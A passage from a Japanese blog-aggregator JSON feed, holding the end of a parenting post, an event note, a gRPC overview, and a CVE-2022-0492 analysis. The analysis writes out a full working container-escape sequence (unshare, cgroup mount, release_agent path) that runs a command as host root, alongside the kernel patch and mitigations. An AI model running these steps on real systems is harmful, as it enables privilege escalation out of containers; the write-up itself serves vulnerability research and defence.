気になる」と言いだしても整形手術でしか解決してあげられないこと、頭の形がコンプレックスで好きな髪型ができない場合があることも教えてもらった。個人的には現地に行くまでヘルメット治療をするかどうかすら決めかねていたが、理想の綺麗な頭の形の模型を触ったところ娘の頭の形がやはり気になった。実際のところ気になっていたのは値段だけだったのでやることにした。古来より「迷う理由が値段なら買え、買う理由が金額ならやめとけ」という言葉があります。 pic.twitter.com/pkuRQCzY5R— キングジム (@kingjim) 2020年12月7日  まとめ娘はあと4日で10ヶ月になるギリギリ9ヶ月でヘルメット治療をはじめた。これから6ヶ月間、定期的な経過観察のために補装具製作所に通ったり皮膚トラブルにならないようにこまめなケアが必要だったり大変なことがたくさんあるだろうが、よい機会だと思ってヘルメット治療にチャレンジしてみようと思う。装着から１週間ちょっと経ったがすでに効果が出てきていて後頭部に丸みが出てきた。これには僕も妻も大喜びだ。これからのさらなる変化が楽しみである。","link":"https://pranc1ngpegasus.hatenablog.com/entry/2022/04/18/000000?utm_source=feed","isoDate":"2022-04-17T15:00:00.000Z","dateMiliSeconds":1650207600000,"authorName":"Temma Fukaya","authorId":"Pranc1ngPegasus"},{"title":"吉祥寺.pm29で久しぶりにLTしてきました #kichijojipm","contentSnippet":"kichijojipm.connpass.com久しぶりにLTしてきました。久しぶりに外で発表したいなと思いつつ、だいぶブランクあるのでちょうどいいリハビリできるところがないかな。— masasuzu (@masasuz) 2022年4月9日  こんなこと考えてたら良いタイミングできちぴーが開催されるので、LT申し込んでみました。#kichijojipm 7年ぶりにLTしたので緊張した。というのと、前回の発表調べて7年前もきちぴーあったのかという驚きもあった。— masasuzu (@masasuz) 2022年4月12日  どうやら7年ぶりだったみたいです。タイミング的に最終出社日の翌日だったので、キャリアの話をしました。diary.masasuzu.net正直、LTにおさまる量じゃなかったのは反省点です。資料ももうちょっとなんとかできたかなあという気持ちがあります。少しずつ登壇回数増やして、勘を取り戻していきたいところ。","link":"https://blog.masasuzu.net/entry/2022/04/15/202342","isoDate":"2022-04-15T11:23:42.000Z","dateMiliSeconds":1650021822000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"インフラエンジニアが学ぶと良さそうなgRPCサーバーについて","contentSnippet":"3-shake にはSreake共有会 という毎週、火曜日と木曜日に担当者が現場で得た知見などを発表する社内勉強会が開催されています。こちらのブログはそれらを変更修正しております。syu-m-5151.hatenablog.com元々しようとしていたの話Go 1.18 の最新情報←Generics の深い話とかはもう既出すぎて気になる人は読んでるGo でのTDD(が実は20周年なので)←書いてる途中で自分が言うべきことなんてないことに気付く今後、案件で増えるであろう gRPC についてインフラエンジニアが知っておいても良いと思ったという話 ← 今ここTL;DRprotobuf (Protocol Buffers) はデータフォーマットで、JSONの役割を置き換えるものです。一方 gRPC は通信プロトコルで、HTTPの役割を置き換えるものです。gRPC をライブラリやツール、トレンドなどを通してgRPCを知るgrpc.ioRPCとはgRPC がこの世の中に急に爆誕したわけではない。そもそも、サービス間での情報のやり取りをどのように行うかというのは古くからある課題の1つです。その中で利用されているのがRPCがあります。RPCとは、Remote Procedure Callの略で遠隔手続き呼出しと訳されます。すなわち、別の場所にあるプログラムを呼び出そうというのを目的としています。違うアプリケーションロジックをあたかも自分のアプリケーションの処理と同じように扱えることができるというのも特徴です。クライアントはサーバーに対し実行する処理を指定するパラメータや引数として与えるデータを送信し、それに対しサーバーはパラメータに応じた処理を実行してその結果をクライアントに返す、というのがRPCの基本的な流れになります。ちなみに、gRPC以外にもJSON-RPC、XML-RPCなどがあります。gRPCの歴史gRPCは、Googleが開発したRPC技術がベースとなっている。Googleでは多数のコンポーネントを組み合わせてサービスを実現しています。いわゆる、マイクロサービスアーキテクチャでシステムを構築していることで知られるが、これらのサービス間で通信を行うためにgRPCの前身Stubbyと呼ばれる技術が開発されました。ただ、StubbyはGoogleのインフラ以外での利用は想定しておらず、独自の仕様が多く、Stubby で使用されていた技術とコンセプトが近いHTTP/2 などの技術が登場したことから、GoogleはStubbyにこれらの技術を取り入れてオープン化することを決め、それがgRPCです。なお、現在ではgRPCはオープンソースで公開されており、現在はLinux Foundation傘下のCloud Native Computing Foundation（CNCF）によって開発が進められています。grpc.iogRPC についてgRPCではほかのRPCと同様、クライアントがサーバーに対しリクエストを送信し、サーバーはそれに応じた処理を実行してその結果を返すという、クライアント−サーバーモデルを採用している。gRPCでは以下のような特徴があります。HTTP/2 による高速な通信バイナリにシリアライズされて送られてくる小さな容量で転送できる一つのコネクションで複数のres/reqが可能(柔軟なストリーミング形式)ミドルウェアの設定でハマった時にはHTTP/2 の問題なのかgRPCの問題なのか切り分ける必要があると思います。Protocol buffersgRPCではProtocol Buffersのサービス定義ファイルからサーバーおよびクライアント向けのコードを自動的に生成するツールが提供されており、これを利用することで簡単にサーバーおよびクライアントを実装できるようになっている。そのため、クライアントとサーバーが異なる言語で実装されていても、問題なく通信を行うことができるようになっている。クライアント・サーバー間の通信に使用するプロトコル（トランスポート）や、やり取りするデータの表現およびシリアライズ方法については置き換えが可能な設計になっているが、デフォルトではトランスポートにHTTP/2が、データのシリアライズにはProtocol Buffersという技術を使用するようになっており、これをそのまま使用するのが一般的です。Protocol BuffersはGoogleが開発したデータフォーマットで、バイナリデータを含むデータでも効率的に扱えるのが特徴です。このProtocol Buffersについても、さまざまなプラットフォーム・プログラミング言語から利用できるライブラリが提供されている。柔軟なストリーミング形式単方向/双方向ストリーミングRPCに対応している。ちなみに私はこの仕様をきちんと把握してなくて2度辛い思いをしているので記憶の片隅においておいてください。Unary RPC1つのリクエストに対して一つのレスポンスを返す一般的な通信です。誤解を恐れぬ言い方をするとREST API のような挙動。Server streaming RPCクライアントから送られてきた一つのリクエストに対して、複数回に分けてレスポンスを返す通信方式です。最後のレスポンスを返した後も任意にサーバーの情報を変更に応じてクライアントにその情報を送ることができます。Client streaming RPCクライアントからリクエストを分割して送ってサーバーはすべてのリクエストを受け取ってからレスポンスを返します。大きなデータをPOSTしたいときに便利です。Bidirectional streaming RPCクライアントからリクエストが送られてきたときにサーバーとクライアントは一つのコネクションを確立しお互いに任意のタイミングでリクエストとレスポンスを送りあうことが可能になります。他のプロトコルとの違いと連携Web サービスやマイクロサービスで使われるプロトコルの代表格は HTTP/HTTPS と、それを利用した REST API です。 HTTP は非常に柔軟ですが、渡すデータのスキーマが標準化されていないため、異なる言語間の RPC を実装するのは面倒です。\xa0OpenAPI という REST API 用の IDL もありますが、Protocol Buffers と比較すると記述量が多いです。また、JSONとprotobufの重要な違いとして、protobufはフォーマットがスキーマに依存するという点があります。JSONはスキーマがなくても完全なシリアライズ・デシリアライズが可能ですが、protobufのデータをシリアライズ・デシリアライズするにはスキーマ情報が必要です。gRPCは技術的には必ずしもスキーマ依存ではありませんが、実装上はスキーマなしで実装するのは困難です。この技術的制約によりスキーマファースト開発が強制されるのが protobuf + gRPC の強みのひとつです。よく言われるのが、GraphQL です。GraphQL は Facebook が開発したプロトコルで、HTTP 上で処理されますが REST API とは異なり GET/POST などのメソッドやステータスコードに意味を持たせていません。 特徴はスキーマはデータ構造を定義するもので、標準化されたクエリにより任意のデータを取得可能な仕組みになっていることです。gRPC がどのようなものか？gRPC Motivation and Design Principles によればgRPCの基本的なコンセプトとして次のものが挙げられている。サービスはオブジェクトではなく、メッセージはリファレンス（参照）ではない適切な適用範囲とシンプルさフリーかつオープン相互運用性があり、一般的なインターネットインフラ内で利用できる汎用性がありながら、専用のものと比べてパフォーマンス面で一般に劣らないアプリケーションレイヤーと分離された構造ペイロードを問わないストリーミングでの情報伝達に対応同期・非同期の両方に対応通信の中断やタイムアウトをサポート確立された通信を処理しつつ新規接続を止めるようなシャットダウンのサポートデータ流量のコントロール機能デフォルト実装に対して後からさまざまな機能を追加可能APIによる機能拡張が可能メタデータの交換をサポート標準化されたステータスコードこのようなものを頭に叩き込んでいると様々な場面でgRPCの設計がどのような思考でそのようになされているか分かる。gRPC Ecosystemgithub.comgRPCを補完するgRPCエコシステムとして各種サービスが紹介されている。ヘルスチェックやPrometheus での設定などがこちらに紹介されているgRPC-WebgRPC-WebによってgRPC通信をWebでも使うことができる。HTTPサーバーが仲介者として機能することなく、WebアプリがgRPCバックエンドサービスと直接通信できるようになるものです。またクライアントもバックエンドもgRPCでの実装なので完全なエンドツーエンドのgRPCサービスアーキテクチャを作成できることが利点です。protoファイルに記述したらあとは、お互い実装ができるので開発も進められやすいです。github.comgRPC-Gatewayprotoファイルに書かれたサービスの定義を理解し、REST APIに変換できます 。gRPC-GatewayだけでRESTfulなAPIを受け取れます。また、protoファイルからswagger.jsonを自動出力してくれる機能も備わっており、ドキュメント生成に関しても十分です。grpc-ecosystem.github.ioenvoygRPC-GatewayとenvoyはどちらもJsonをgRPCに変換してくれる機能を持ち合わせています。JSONを変換してくれるだけよくGolangでの実装だったら、gRPC-Gatewayでいいのかなと思いますがそれ以外にはEnvoy にはさまざまな機能があるので一気に全部やってしまいたい方にはEnvoyの利用を考えても良いのかな？と思います。www.envoyproxy.iogRPC をライブラリやツールについてインフラエンジニアがgRPC に関わる時は開発というより運用や保守に関してだろう。なので、今回、紹介するツールもそれらに沿って紹介したい。ツールの使い方を調べれば自ずとgRPCの輪郭が見えてくるかと思います。Awesome gRPC はgRPC に 関するキュレーションを行うリポジトリ。大体のツールはここを確認すれば良い。https://github.com/grpc-ecosystem/awesome-grpcgrpc_cligrpc/command_line_tool.md at master \xb7 grpc/grpcgRPC の公式リポジトリに同梱されている grpc_cli は公式の gRPC クライアントツールといえますが、最低限の機能しか備えていません。例えば他の gRPC クライアントツールではほぼ実装されているメタデータの送信ができない、JSON 形式でのリクエスト内容の記述を受け付けられないといった問題があります。また、インストールするためにはソースコードからビルドする必要があり煩雑なのであまり、使われていません。gRPCurlhttps://github.com/fullstorydev/grpcurl最も使われている gRPC クライアントツールです。現在も活発にメンテナンスされています。機能面でもたいていのユースケースは網羅されており、機能の不足で困るようなことはほとんどないでしょう。prototoolhttps://github.com/uber/prototoolPrototoolは Uber Technologies によって開発された Protocol Buffers のユーティリティツールです。Prototool には gRPC のエンドポイントを呼び出せるサブコマンドが付属しています。ただし、このサブコマンドは fullstorydev/grpcurl に大きく依存しており、実質 gRPCurl のサブセットとなっています。現在は Protocol Buffers のユーティリティツールとして\xa0Buf を推奨するしています。Bufhttps://github.com/bufbuild/bufProtocol Buffers のユーティリティツール 戦争に勝ち抜いたと言っても良い buf は自動ファイル検出、正確なlintとbreaking checkersの構成を選択することができたり、エラー出力はどのエディターでも簡単に解析可能(vs Code はさまざまなツールが動くが、vim はこれぐらいしか、プラグインがうまく動かない)、コンパイルの高速化、protocのプロトコルプラグインとして使用する。gRPCUIhttps://github.com/fullstorydev/grpcuigrpcuiは、ブラウザ経由でgRPCサーバと対話するためのコマンドラインツールです。Postman のようなものですが、REST ではなく gRPC API のためのものです。evansgRPC クライアントツールです。REPL モードで手軽に手動テストを行えますのでデバッグの時にあるとめちゃくちゃ便利です。https://github.com/ktr0731/evansJSON-to-ProtoJSONを即座にProtobufに変換してくれるツールになります。JSON-to-Proto次回予告:gRPC を使ったアプリケーション開発の流れそれでは、gRPCを使ったアプリケーション開発を行う場合、実際にどのような手順を踏めば良いかを紹介していこう。この場合の基本的な流れは次のようになる。Protocol Buffersを使ったサービスの定義サービス定義ファイルからのコードの生成生成したコードに独自の自前の実装を追加する上記に関してはハンズオンなどで実施していきたいと思います。また、2022年4月27日に「Protocol Buffers/gRPC を安全に書き進めるためのエトセトラ」と題してOWASP Fukuoka Meeting #6にて登壇いたしますーowasp-kyushu.connpass.com死霊\uD83D\uDC7B はこちらです speakerdeck.com参考文献公式資料grpc.iogRPC の公式サイトです。仕様だけでなく、各言語のチュートリアルもあります。grpc.github.io詳細なドキュメント群です。gRPC over HTTP2上記サイトの一ドキュメントです。HTTP/2 をどう利用しているかの仕様書です。developers.google.com/protocol-buffersProtocol Buffers の公式サイトです。The complete gRPC courseGoとJavaで開発できるチュートリアルです。gRPC: Up and RunninggRPC と Protocol Buffers の本です。Securing your gRPCApplicationKubeCon 2019 NA のセッションの一つで、gRPC の認証・認可の実装方法を詳しく解説しています。","link":"https://syu-m-5151.hatenablog.com/entry/2022/04/12/130411","isoDate":"2022-04-12T04:04:11.000Z","dateMiliSeconds":1649736251000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"CVE-2022-0492 調査まとめ","contentSnippet":"cgroups v1 の脆弱性 CVE-2022-0492 について、調査した内容をまとめました。イベントで発表した内容ですが、時間の都合で語りきれなかった部分も多く、内容を加筆してブログに書くことにしました。 speakerdeck.comCVE-2022-0492 概要release_agent についてエクスプロイト前提条件要点検証修正パッチコンテナセキュリティseccompAppArmor (SELinux)Kubernetes の場合EKS, GKE の場合さいごに参考リンクCVE-2022-0492LinuxコンテナセキュリティCVE-2022-0492 概要CVE-2022-0492 は cgroups v1 における特権昇格・コンテナブレイクアウトの脆弱性です。cgroups v1 の release_agent 機能を悪用することで、コンテナからホストの root 権限で任意コマンド実行が可能となります。詳細は後述しますが、これは本来特権コンテナに限定されるべき設定が、capabilities のチェック漏れにより非特権コンテナから行える状態だったことが原因です。本脆弱性は seccomp や AppArmor/SELinux を有効にすることで回避可能です。release_agent についてcgroups v1 は cpu, memory, pids のようにリソースをサブシステムに分割し、各サブシステムがディレクトリ構造を取っています。# ls /sys/fs/cgroup/blkio  cpu,cpuacct  cpuset   freezer  memory  net_cls           net_prio    pids  systemdcpu    cpuacct      devices  hugetlb  misc    net_cls,net_prio  perf_event  rdma  unifiedrelease_agent は各 cgroup サブシステムのルートディレクトリに配置されるファイルで、cgroup 内のプロセスが終了する時に起動させるプログラムを設定します。リリースエージェントプログラム の起動の有無は、cgroup ディレクトリ内の notify_on_release の値で判断されます。このファイルはルート以下、各 child cgroup のディレクトリにも配置されています。notify_on_release = 1 の場合、リリースエージェントプログラムを起動します。cgroup のディレクトリ構成pids cgroup のルートディレクトリを見ると、以下のように release_agent, notify_on_release のファイルを確認できます。# ls /sys/fs/cgroup/pids/cgroup.clone_children  cgroup.sane_behavior  docker      notify_on_release  system.slice  user.slicecgroup.procs           default               init.scope  release_agent      tasks# cat /sys/fs/cgroup/pids/release_agent   ← 空のファイル# cat /sys/fs/cgroup/pids/notify_on_release 0ちなみにコンテナに CAP_SYS_ADMIN がある場合、release_agent を使えば本脆弱性を利用することなくブレイクアウト可能です。https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)また cgroups v2 には release_agent がなく、リリースの通知は別の仕組みを使っています。エクスプロイト前提条件本脆弱性は次の条件を全て満たす場合に影響があります。root ユーザーまたは、no_new_privsフラグなしでコンテナを起動しているseccomp, AppArmor/SELinux がいずれも有効でないホストの非特権ユーザー名前空間が有効（ubuntu ではデフォルトの設定です）各設定の確認方法↓# cat /proc/sys/kernel/unprivileged_userns_clone   ← 非特権ユーザ名前空間1# cat /proc/self/status | grep Seccomp   ← seccompSeccomp:    0Seccomp_filters:    0# cat /proc/self/attr/current   ← AppArmordocker-default (enforce)要点コンテナから cgroups の release_agent に書き込みたいrdma サブシステムは root cgroup に所属しているが、readonly でマウントされているcgroup を rw で新たにマウントしたいが、マウントには CAP_SYS_ADMIN が必要unshare で user namespace (ns) を作成すれば CAP_SYS_ADMIN が得られるcgroup, mount ns も同時に作成することで cgroup をマウント可能にrdma cgroup をマウント すると release_agent に書き込み可能cgroup 内のプロセスが終了するタイミングで、任意のプログラムをホストの root 権限で実行検証脆弱な Kernel バージョンで CVE-2022-0492 を検証します。インスタンスに用意した ubuntu 上で、seccomp, AppArmor をオフにした docker コンテナを起動します。# uname -aLinux ip-172-31-1-29 5.13.0-1017-aws #19~20.04.1-Ubuntu SMP Mon Mar 7 12:53:12 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux# docker run --rm -it --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu bashdocker はコンテナ作成時に cgroup ns を作成しないので、コンテナはホストと同じ cgroup ns に所属しています。自身の cgroup を確認すれば root cgroup からのパスがわかるため、コンテナ内から各サブシステムが root cgroup に所属しているかどうか調べることができます。root@ab988587a245:/# cat /proc/self/cgroup13:misc:/12:rdma:/   ← rdma サブシステムは root cgroup11:hugetlb:/docker/2fe60dee4cbe58e3815f096eb1253d21bab225fb764dda97e211820883cf1a6a10:cpuset:/docker/2fe60dee4cbe58e3815f096eb1253d21bab225fb764dda97e211820883cf1a6a9:net_cls,net_prio:/docker/2fe60dee4cbe58e3815f096eb1253d21bab225fb764dda97e211820883cf1a6a8:perf_event:/docker/2fe60dee4cbe58e3815f096eb1253d21bab225fb764dda97e211820883cf1a6a7:blkio:/docker/2fe60dee4cbe58e3815f096eb1253d21bab225fb764dda97e211820883cf1a6a6:devices:/docker/2fe60dee4cbe58e3815f096eb1253d21bab225fb764dda97e211820883cf1a6a5:freezer:/docker/2fe60dee4cbe58e3815f096eb1253d21bab225fb764dda97e211820883cf1a6a4:cpu,cpuacct:/docker/2fe60dee4cbe58e3815f096eb1253d21bab225fb764dda97e211820883cf1a6a3:pids:/docker/2fe60dee4cbe58e3815f096eb1253d21bab225fb764dda97e211820883cf1a6a2:memory:/docker/2fe60dee4cbe58e3815f096eb1253d21bab225fb764dda97e211820883cf1a6a1:name=systemd:/docker/2fe60dee4cbe58e3815f096eb1253d21bab225fb764dda97e211820883cf1a6a0::/system.slice/containerd.serviceこれで rdma サブシステムが root cgroup に所属していることがわかりました。root@ab988587a245:/# mount | grep \'cgroup (ro\'cgroup on /sys/fs/cgroup/systemd type cgroup (ro,nosuid,nodev,noexec,relatime,xattr,name=systemd)cgroup on /sys/fs/cgroup/memory type cgroup (ro,nosuid,nodev,noexec,relatime,memory)cgroup on /sys/fs/cgroup/pids type cgroup (ro,nosuid,nodev,noexec,relatime,pids)cgroup on /sys/fs/cgroup/cpu,cpuacct type cgroup (ro,nosuid,nodev,noexec,relatime,cpu,cpuacct)cgroup on /sys/fs/cgroup/freezer type cgroup (ro,nosuid,nodev,noexec,relatime,freezer)cgroup on /sys/fs/cgroup/devices type cgroup (ro,nosuid,nodev,noexec,relatime,devices)cgroup on /sys/fs/cgroup/blkio type cgroup (ro,nosuid,nodev,noexec,relatime,blkio)cgroup on /sys/fs/cgroup/perf_event type cgroup (ro,nosuid,nodev,noexec,relatime,perf_event)cgroup on /sys/fs/cgroup/net_cls,net_prio type cgroup (ro,nosuid,nodev,noexec,relatime,net_cls,net_prio)cgroup on /sys/fs/cgroup/cpuset type cgroup (ro,nosuid,nodev,noexec,relatime,cpuset)cgroup on /sys/fs/cgroup/hugetlb type cgroup (ro,nosuid,nodev,noexec,relatime,hugetlb)cgroup on /sys/fs/cgroup/rdma type cgroup (ro,nosuid,nodev,noexec,relatime,rdma)   ← readonly でマウントされているcgroup on /sys/fs/cgroup/misc type cgroup (ro,nosuid,nodev,noexec,relatime,misc)root@ab988587a245:/# ls -l /sys/fs/cgroup/rdma/total 0-rw-r--r--  1 root root 0 Mar 15 01:40 cgroup.clone_children-rw-r--r--  1 root root 0 Mar 15 01:40 cgroup.procs-r--r--r--  1 root root 0 Mar 15 01:40 cgroup.sane_behavior-rw-r--r--  1 root root 0 Mar 15 01:40 notify_on_release-rw-r--r--  1 root root 0 Mar 29 16:01 release_agentdrwxr-xr-x 13 root root 0 Mar 26 21:07 system.slice-rw-r--r--  1 root root 0 Mar 15 01:40 tasksroot@ab988587a245:/# echo test > /sys/fs/cgroup/rdma/release_agent bash: /sys/fs/cgroup/rdma/release_agent: Read-only file system   ← 書き込みエラーというわけで、cgroup を rw でマウントできれば良いことになります。ここで capability を確認すると、コンテナは CAP_SYS_ADMIN を持っておらず、このままでは cgroup をマウントする権限がありません。root@ab988587a245:/# apt update && apt install -y libcap2-binroot@ab988587a245:/# cat /proc/self/status | grep CapEffCapEff: 00000000a80425fbroot@ab988587a245:/# capsh --decode=00000000a80425fb0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcaproot@ab988587a245:/# mount -t cgroup -o rdma cgroup /mntmount: /mnt: permission denied.   ← マウントエラーCAP_SYS_ADMIN を付与するため user ns を作成し新たにプロセスを立ち上げます。さらに mount, cgroup ns を同時に作成することで、コンテナ内でのマウントが可能になります。マウントさえできれば release_agent に書き込むことができます。root@ab988587a245:/# unshare -rmC bash   ← user, mount, cgroup ns を作成root@ab988587a245:/# cat /proc/self/status | grep CapEffCapEff: 000001ffffffffffroot@ab988587a245:/# capsh --decode=000001ffffffffff0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,38,39,40   ← CAP_SYS_ADMIN を持つroot@ab988587a245:/# mount -t cgroup -o rdma cgroup /mnt   ← rdma サブシステムをマウントroot@ab988587a245:/# ls /mntcgroup.clone_children  cgroup.procs  cgroup.sane_behavior  notify_on_release  release_agent  tasksroot@ab988587a245:/# mount | grep \'cgroup (rw\'cgroup on /mnt type cgroup (rw,relatime,rdma)ここまでで、コンテナ内から release_agent に書き込めるようになりました。続いてコンテナ内のルート (/) に、ホストの権限で実行させたいプログラムを配置します。今回は /etc/passwd をコンテナ内に出力するスクリプトを作成しています。release_agent に設定するのはプログラムのパスですが、ホストから見た絶対パスを指定する必要があります。root@ab988587a245:/# host_path=`sed -n \'s/.*\\\\perdir=\\\\([^,]*\\\\).*/\\\\1/p\' /etc/mtab`root@ab988587a245:/# echo $host_path/var/lib/docker/overlay2/20c4102a1a817b0e564734054b876c051732c62f4993ce682508ac7cd7fcb1c6/diff   ← upperdir のパスroot@ab988587a245:/# echo \\"$host_path/cmd\\" > /mnt/release_agentroot@ab988587a245:/# echo \'#!/bin/sh\' > /cmdroot@ab988587a245:/# echo \\"cat /etc/passwd > $host_path/output\\" >> /cmdroot@ab988587a245:/# chmod a+x /cmd最後に用意したプログラムを起動するため、cgroup 内のプロセスを空にします。root@ab988587a245:/# mkdir /mnt/xx   ← child cgroup を作成root@ab988587a245:/# ls /mnt/xx/cgroup.clone_children  cgroup.procs  notify_on_release  rdma.current  rdma.max  tasksroot@ab988587a245:/# echo 1 > /mnt/xx/notify_on_releaseroot@ab988587a245:/# sh -c \\"echo \\\\$\\\\$\\" > /mnt/xx/cgroup.procs   ← すぐに終了するプロセスを child cgroup に追加root@ab988587a245:/# cat /output   ← コンテナ内にホストの /etc/passwd が出力されているroot:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologin...修正パッチhttps://github.com/torvalds/linux/commit/24f6008564183aa120d07c03d9289519c2fe02afhttps://github.com/torvalds/linux/commit/467a726b754f474936980da793b4ff2ec3e382a7  static ssize_t cgroup_release_agent_write(struct kernfs_open_file *of, char *buf, size_t nbytes, loff_t off)  {    struct cgroup *cgrp;+   struct cgroup_file_ctx *ctx;    BUILD_BUG_ON(sizeof(cgrp->root->release_agent_path) < PATH_MAX);+   /*+    * Release agent gets called with all capabilities,+    * require capabilities to set release agent.+    */+   ctx = of->priv;+   if ((ctx->ns->user_ns != &init_user_ns) ||+       !file_ns_capable(of->file, &init_user_ns, CAP_SYS_ADMIN))+     return -EPERM;    cgrp = cgroup_kn_lock_live(of->kn, false);修正後は上記検証手順での release_agent への書き込みはできません。これは書き込みプロセスが CAP_SYS_ADMIN は持ちますが、init user ns でないためだと理解しています。init user ns かつ CAP_SYS_ADMIN を同時に満たすのは、非特権コンテナにおいては不可能となりました。（厳密にはプロセスの capability と、対象 cgroup の所有 user ns のチェックを行なっています）# uname -r5.17.0-051700rc7-generic# docker run --rm -it --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu bashroot@a45e44c77da9:/# unshare -rmC bashroot@a45e44c77da9:/# mount -t cgroup -o rdma cgroup /mntroot@a45e44c77da9:/# ls /mntcgroup.clone_children  cgroup.procs  cgroup.sane_behavior  notify_on_release  release_agent  tasksroot@a45e44c77da9:/# echo test > /mnt/release_agent bash: echo: write error: Operation not permittedただし特権コンテナでは引き続きコンテナブレイクアウトは可能です。SELinux を設定する等の対策は必要です。コンテナセキュリティコンテナセキュリティと本脆弱性の関係について簡単に見ていきます。seccompseccomp はコンテナ内で実行できるシステムコールを制限します。システムコールをブロックするため、ns を作成する段階でエラーとなります。# docker run --rm -it --security-opt apparmor=unconfined ubuntu bashroot@fb3522b81478:/# cat /proc/self/status | grep SeccompSeccomp:    2Seccomp_filters:    1root@fb3522b81478:/# unshare -rmC bashunshare: unshare failed: Operation not permittedAppArmor (SELinux)ファイル操作、プログラム実行、capabilities 等を制限します。# docker run --rm -it --security-opt seccomp=unconfined ubuntu bashroot@46912ffebb2c:/# cat /proc/self/attr/current docker-default (enforce)root@46912ffebb2c:/# unshare -rmC bashunshare: cannot change root filesystem propagation: Permission deniedKubernetes の場合Kubernetes においては、seccomp や AppArmor/SELinux は環境や設定次第では OFF のため影響が出る可能性があります。AppArmor/SELinux は Kubernetes ノードやコンテナランタイムで有効にする必要があります。さらに seccomp は Pod のマニフェストにも設定しなければなりません。また securityContext に適切な設定をすることも重要です。allowPrivilegeEscalation, readOnlyRootFilesystem, capabilities 等でコンテナの機能を制限すれば、今後生まれる脆弱性の予防にもなると考えます。EKS, GKE の場合EKS のノードに使われる Amazon Linux 2 では、rdma のようなコンテナ内に root cgroup がマウントされたサブシステムはないようです。このため cgroup を新規にマウントしても release_agent は見えず、本脆弱性を悪用することはできません。# docker run --rm -it --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu bashroot@287fcd93a54f:/# cat /proc/self/cgroup 11:pids:/docker/287fcd93a54f465d1c8c1307fe198acc8592b0000e0571738a138bf1b1c996b010:devices:/docker/287fcd93a54f465d1c8c1307fe198acc8592b0000e0571738a138bf1b1c996b09:hugetlb:/docker/287fcd93a54f465d1c8c1307fe198acc8592b0000e0571738a138bf1b1c996b08:perf_event:/docker/287fcd93a54f465d1c8c1307fe198acc8592b0000e0571738a138bf1b1c996b07:net_cls,net_prio:/docker/287fcd93a54f465d1c8c1307fe198acc8592b0000e0571738a138bf1b1c996b06:blkio:/docker/287fcd93a54f465d1c8c1307fe198acc8592b0000e0571738a138bf1b1c996b05:memory:/docker/287fcd93a54f465d1c8c1307fe198acc8592b0000e0571738a138bf1b1c996b04:cpu,cpuacct:/docker/287fcd93a54f465d1c8c1307fe198acc8592b0000e0571738a138bf1b1c996b03:freezer:/docker/287fcd93a54f465d1c8c1307fe198acc8592b0000e0571738a138bf1b1c996b02:cpuset:/docker/287fcd93a54f465d1c8c1307fe198acc8592b0000e0571738a138bf1b1c996b01:name=systemd:/docker/287fcd93a54f465d1c8c1307fe198acc8592b0000e0571738a138bf1b1c996b0GKE のノードに使われる COS では、デフォルトで AppArmor が有効になっているようです。(https://cloud.google.com/container-optimized-os/docs/how-to/secure-apparmor)$ k run ubuntu --image ubuntu -- sleep 3600pod/ubuntu created$ k exec -it ubuntu -- bashroot@ubuntu:/# cat /proc/self/attr/current cri-containerd.apparmor.d (enforce)root@ubuntu:/# unshare -rmC bashunshare: cannot change root filesystem propagation: Permission denied以上のことから EKS, GKE では本脆弱性の影響はなさそうです。さいごに本脆弱性の調査を通じて、コンテナを構成する Linux の要素技術やコンテナセキュリティへの理解が深まりました。Linux の技術について包括的に学ぶのは（個人的には）難しいので、このような脆弱性の調査から学ぶアプローチも良いのではと思います。本記事が皆さんの学習の糧になれば幸いです。参考リンクCVE-2022-0492https://unit42.paloaltonetworks.jp/cve-2022-0492-cgroups/https://sysdig.jp/blog/detecting-mitigating-cve-2021-0492-sysdig/https://terenceli.github.io/%E6%8A%80%E6%9C%AF/2022/03/06/cve-2022-0492https://nvd.nist.gov/vuln/detail/CVE-2022-0492Linuxhttps://lwn.net/Articles/679786/https://www.nginx.com/blog/what-are-namespaces-cgroups-how-do-they-work/https://linuxhint.com/install-linux-kernel-ubuntu/https://man7.org/linux/man-pages/man7/cgroups.7.htmlhttps://blog.tiqwab.com/2021/11/13/docker-and-cgroups.htmlhttps://en.wikipedia.org/wiki/Seccomphttps://en.wikipedia.org/wiki/Security-Enhanced_Linuxhttps://manpages.ubuntu.com/manpages/xenial/man5/apparmor.d.5.htmlコンテナセキュリティhttps://container-security.dev/security/breakout-to-host.htmlhttps://speakerdeck.com/mochizuki875/container-dev-securityhttps://speakerdeck.com/mochizuki875/container-seccomp","link":"https://kyohmizu.hatenablog.com/entry/2022/04/06/233150","isoDate":"2022-04-06T14:31:50.000Z","dateMiliSeconds":1649255510000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"こだわりを持ってつくられた製品に魅かれる","contentSnippet":"